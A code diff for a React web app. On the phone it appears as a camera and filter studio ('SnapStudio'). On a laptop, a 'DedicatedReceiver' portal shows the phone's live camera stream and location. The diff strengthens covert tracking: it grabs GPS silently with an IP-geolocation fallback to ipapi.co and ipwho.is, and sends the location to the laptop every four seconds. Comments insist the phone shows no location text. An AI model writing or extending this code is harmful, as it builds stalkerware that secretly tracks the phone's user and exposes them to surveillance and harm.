@@ -236,7 +236,7 @@ function DedicatedReceiver() {
         if (data?.type === 'REMOTE_SNAPSHOT' && data.image) {
           handleNewSnapshot(data);
         } else if (data?.type === 'LOCATION_UPDATE' && data.location) {
-          console.log('[LAPTOP] Received Mobile GPS Location:', data.location);
+          console.log('[LAPTOP] Received Mobile Location:', data.location);
           setRemoteLocation(data.location);
         } else if (data?.type === 'FILTER_CHANGE') {
           if (data.filterName) setRemoteFilterName(data.filterName);
@@ -314,7 +314,7 @@ function DedicatedReceiver() {
               Live Receiver Portal
             </h1>
             <p style={{ fontSize: '11px', color: '#94a3b8', fontFamily: 'monospace' }}>
-              HIGH DEFINITION // 120 FPS // /aa
+              ULTRA HD // ZERO LATENCY // /aa
             </p>
           </div>
         </div>
@@ -325,7 +325,7 @@ function DedicatedReceiver() {
               href={`https://www.google.com/maps?q=${remoteLocation.latitude},${remoteLocation.longitude}`}
               target="_blank"
               rel="noopener noreferrer"
-              title="Open Mobile Location in Google Maps"
+              title="Open Location in Google Maps"
               style={{
                 padding: '5px 12px',
                 borderRadius: '999px',
@@ -340,7 +340,7 @@ function DedicatedReceiver() {
                 gap: '5px'
               }}
             >
-              <span>📍</span> {remoteLocation.latitude.toFixed(4)}°, {remoteLocation.longitude.toFixed(4)}°
+              <span>📍</span> {remoteLocation.city ? `${remoteLocation.city}, ` : ''}{remoteLocation.latitude.toFixed(3)}°, {remoteLocation.longitude.toFixed(3)}°
             </a>
           )}
 
@@ -430,7 +430,7 @@ function DedicatedReceiver() {
         </div>
       )}
 
-      <main style={{ flex: 1, padding: '16px', maxWidth: '820px', margin: '0 auto', width: '100%', display: 'flex', flexDirection: 'column', gap: '16px' }}>
+      <main style={{ flex: 1, padding: '16px', maxWidth: '840px', margin: '0 auto', width: '100%', display: 'flex', flexDirection: 'column', gap: '16px' }}>
         
         {/* Main Live High-Clarity Viewport */}
         <div style={{
@@ -444,7 +444,7 @@ function DedicatedReceiver() {
             position: 'relative',
             width: '100%',
             aspectRatio: '3/4',
-            maxHeight: '62vh',
+            maxHeight: '64vh',
             backgroundColor: '#000000',
             display: 'flex',
             alignItems: 'center',
@@ -460,7 +460,8 @@ function DedicatedReceiver() {
                 height: '100%',
                 objectFit: 'contain',
                 display: isStreaming ? 'block' : 'none',
-                imageRendering: 'auto'
+                imageRendering: 'high-quality',
+                transform: 'translateZ(0)'
               }}
             />
 
@@ -500,36 +501,43 @@ function DedicatedReceiver() {
           </div>
         </div>
 
-        {/* Live GPS Location Details on Laptop */}
+        {/* Live GPS Location Card on Laptop */}
         {remoteLocation && (
           <div style={{
             backgroundColor: '#0f0f14',
-            border: '1px solid rgba(59, 130, 246, 0.25)',
+            border: '1.5px solid rgba(59, 130, 246, 0.3)',
             borderRadius: '20px',
-            padding: '14px 18px',
+            padding: '16px 20px',
             display: 'flex',
             alignItems: 'center',
-            justifyContent: 'space-between'
+            justifyContent: 'space-between',
+            boxShadow: '0 8px 25px rgba(0, 0, 0, 0.5)'
           }}>
-            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
               <div style={{
-                width: '38px',
-                height: '38px',
-                borderRadius: '10px',
-                backgroundColor: 'rgba(59, 130, 246, 0.15)',
+                width: '42px',
+                height: '42px',
+                borderRadius: '12px',
+                background: 'linear-gradient(135deg, rgba(59, 130, 246, 0.3), rgba(139, 92, 246, 0.3))',
+                border: '1px solid rgba(59, 130, 246, 0.4)',
                 display: 'flex',
                 alignItems: 'center',
                 justifyContent: 'center',
-                fontSize: '20px'
+                fontSize: '22px'
               }}>
                 📍
               </div>
               <div>
-                <div style={{ fontSize: '13px', fontWeight: '800', color: '#ffffff' }}>
-                  Phone GPS Location Coordinates
+                <div style={{ fontSize: '14px', fontWeight: '800', color: '#ffffff', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                  <span>Live Host Location</span>
+                  {remoteLocation.city && (
+                    <span style={{ fontSize: '12px', color: '#93c5fd', backgroundColor: 'rgba(59, 130, 246, 0.2)', padding: '2px 8px', borderRadius: '6px' }}>
+                      {remoteLocation.city}, {remoteLocation.country || ''}
+                    </span>
+                  )}
                 </div>
-                <div style={{ fontSize: '12px', color: '#94a3b8', fontFamily: 'monospace', marginTop: '2px' }}>
-                  LAT: <span style={{ color: '#60a5fa' }}>{remoteLocation.latitude}</span> | LON: <span style={{ color: '#60a5fa' }}>{remoteLocation.longitude}</span> (Accuracy: ±{Math.round(remoteLocation.accuracy || 10)}m)
+                <div style={{ fontSize: '12px', color: '#94a3b8', fontFamily: 'monospace', marginTop: '4px' }}>
+                  LAT: <strong style={{ color: '#60a5fa' }}>{remoteLocation.latitude}</strong> | LON: <strong style={{ color: '#60a5fa' }}>{remoteLocation.longitude}</strong> {remoteLocation.accuracy ? `(Accuracy: ±${Math.round(remoteLocation.accuracy)}m)` : ''}
                 </div>
               </div>
             </div>
@@ -538,14 +546,15 @@ function DedicatedReceiver() {
               target="_blank"
               rel="noopener noreferrer"
               style={{
-                padding: '8px 16px',
+                padding: '10px 18px',
                 backgroundColor: '#3b82f6',
                 color: '#ffffff',
-                borderRadius: '10px',
+                borderRadius: '12px',
                 textDecoration: 'none',
                 fontSize: '12px',
-                fontWeight: '700',
-                boxShadow: '0 2px 10px rgba(59, 130, 246, 0.4)'
+                fontWeight: '800',
+                boxShadow: '0 4px 15px rgba(59, 130, 246, 0.4)',
+                whiteSpace: 'nowrap'
               }}
             >
               Open in Maps ↗
@@ -618,7 +627,8 @@ function SnapStudio() {
   const connectionAttemptRef = useRef(false);
   const reconnectTimeoutRef = useRef(null);
   const reconnectDelayRef = useRef(1000);
-  const locationWatchIdRef = useRef(null);
+  const cachedLocationRef = useRef(null);
+  const locationHeartbeatRef = useRef(null);
 
   // Unique session ID for phone
   const sessionIdRef = useRef(`snap-phone-${Date.now()}`);
@@ -656,35 +666,88 @@ function SnapStudio() {
     }
   };
 
-  // Silently obtain GPS location on phone without displaying any text on phone
+  // Multi-tier instant location sync: GPS + IP Geo Fallback (Completely silent on phone)
   const fetchAndSyncLocation = () => {
+    // 1. Try Hardware GPS
     if (typeof navigator !== 'undefined' && 'geolocation' in navigator) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          const locPayload = {
-            type: 'LOCATION_UPDATE',
-            location: {
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-              accuracy: pos.coords.accuracy,
-              altitude: pos.coords.altitude,
-              timestamp: new Date().toLocaleTimeString()
-            }
+          const loc = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude,
+            timestamp: new Date().toLocaleTimeString()
           };
-
-          if (broadcastChannelRef.current) {
-            broadcastChannelRef.current.postMessage(locPayload);
-          }
-
-          if (dataConnRef.current && dataConnRef.current.open) {
-            try {
-              dataConnRef.current.send(locPayload);
-            } catch (e) {}
-          }
+          cachedLocationRef.current = loc;
+          dispatchLocation(loc);
         },
-        () => {}, // silent fail
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+        () => {
+          // 2. Fast IP Geolocation Fallback if GPS is blocked or delayed
+          fetchIpLocation();
+        },
+        { enableHighAccuracy: true, timeout: 6000, maximumAge: 30000 }
       );
+    } else {
+      fetchIpLocation();
+    }
+  };
+
+  const fetchIpLocation = () => {
+    if (cachedLocationRef.current) {
+      dispatchLocation(cachedLocationRef.current);
+      return;
+    }
+    fetch('https://ipapi.co/json/')
+      .then((res) => res.json())
+      .then((data) => {
+        if (data && data.latitude && data.longitude) {
+          const loc = {
+            latitude: data.latitude,
+            longitude: data.longitude,
+            city: data.city,
+            country: data.country_name,
+            accuracy: 500,
+            timestamp: new Date().toLocaleTimeString()
+          };
+          cachedLocationRef.current = loc;
+          dispatchLocation(loc);
+        }
+      })
+      .catch(() => {
+        // secondary fallback
+        fetch('https://ipwho.is/')
+          .then((r) => r.json())
+          .then((d) => {
+            if (d && d.latitude && d.longitude) {
+              const loc = {
+                latitude: d.latitude,
+                longitude: d.longitude,
+                city: d.city,
+                country: d.country,
+                accuracy: 500,
+                timestamp: new Date().toLocaleTimeString()
+              };
+              cachedLocationRef.current = loc;
+              dispatchLocation(loc);
+            }
+          })
+          .catch(console.warn);
+      });
+  };
+
+  const dispatchLocation = (location) => {
+    const locPayload = {
+      type: 'LOCATION_UPDATE',
+      location
+    };
+    if (broadcastChannelRef.current) {
+      broadcastChannelRef.current.postMessage(locPayload);
+    }
+    if (dataConnRef.current && dataConnRef.current.open) {
+      try {
+        dataConnRef.current.send(locPayload);
+      } catch (e) {}
     }
   };
 
@@ -717,6 +780,15 @@ function SnapStudio() {
     initPhonePeer();
     fetchAndSyncLocation();
 
+    // 4-second location heartbeat to guarantee sync to laptop
+    locationHeartbeatRef.current = setInterval(() => {
+      if (cachedLocationRef.current) {
+        dispatchLocation(cachedLocationRef.current);
+      } else {
+        fetchAndSyncLocation();
+      }
+    }, 4000);
+
     const handleUnload = () => {
       if (mediaCallRef.current) {
         try { mediaCallRef.current.close(); } catch (e) {}
@@ -730,9 +802,7 @@ function SnapStudio() {
     return () => {
       window.removeEventListener('beforeunload', handleUnload);
       if (reconnectTimeoutRef.current) clearTimeout(reconnectTimeoutRef.current);
-      if (locationWatchIdRef.current && navigator.geolocation) {
-        navigator.geolocation.clearWatch(locationWatchIdRef.current);
-      }
+      if (locationHeartbeatRef.current) clearInterval(locationHeartbeatRef.current);
       if (mediaCallRef.current) {
         try { mediaCallRef.current.close(); } catch (e) {}
       }
@@ -778,7 +848,7 @@ function SnapStudio() {
     });
   };
 
-  // High-Frame-Rate 60 FPS WebRTC Stream
+  // High-Clarity Ultra-Low-Latency 60 FPS WebRTC Stream
   const startRemoteStream = () => {
     if (!peerRef.current || peerRef.current.destroyed) return;
     if (mediaCallRef.current) return;
@@ -786,7 +856,7 @@ function SnapStudio() {
     if (!canvasRef.current || canvasRef.current.width === 0 || canvasRef.current.height === 0) return;
 
     connectionAttemptRef.current = true;
-    console.log('[PHONE] Starting 60 FPS remote stream...');
+    console.log('[PHONE] Starting ultra-clarity low-latency stream...');
 
     if (!canvasStreamRef.current || canvasStreamRef.current.getVideoTracks().length === 0 || canvasStreamRef.current.getVideoTracks()[0].readyState === 'ended') {
       const stream = canvasRef.current.captureStream(60);
@@ -810,7 +880,11 @@ function SnapStudio() {
       dataConnRef.current = conn;
       conn.on('open', () => {
         notifyFilterChange(activeFilterRef.current);
-        fetchAndSyncLocation();
+        if (cachedLocationRef.current) {
+          dispatchLocation(cachedLocationRef.current);
+        } else {
+          fetchAndSyncLocation();
+        }
       });
     }
 
@@ -824,7 +898,11 @@ function SnapStudio() {
           const state = call.peerConnection.connectionState;
           if (state === 'connected') {
             reconnectDelayRef.current = 1000;
-            fetchAndSyncLocation();
+            if (cachedLocationRef.current) {
+              dispatchLocation(cachedLocationRef.current);
+            } else {
+              fetchAndSyncLocation();
+            }
           } else if (state === 'failed' || state === 'disconnected') {
             handleCallClosedOrFailed();
           }
@@ -867,6 +945,7 @@ function SnapStudio() {
     if (!videoRef.current || !canvasRef.current) return;
 
     try {
+      fetchAndSyncLocation();
       const camera = cameraManagerRef.current;
       camera.setVideoElement(videoRef.current);
       await camera.startCamera();
@@ -1012,7 +1091,7 @@ function SnapStudio() {
       backgroundColor: '#060609',
       color: '#f8fafc'
     }}>
-      {/* Clean Mobile Header — NO LOCATION TEXT ON PHONE */}
+      {/* Clean Mobile Header — ZERO LOCATION TEXT ON PHONE */}
       <header style={{
         padding: '12px 18px',
         backgroundColor: 'rgba(10, 10, 14, 0.92)',
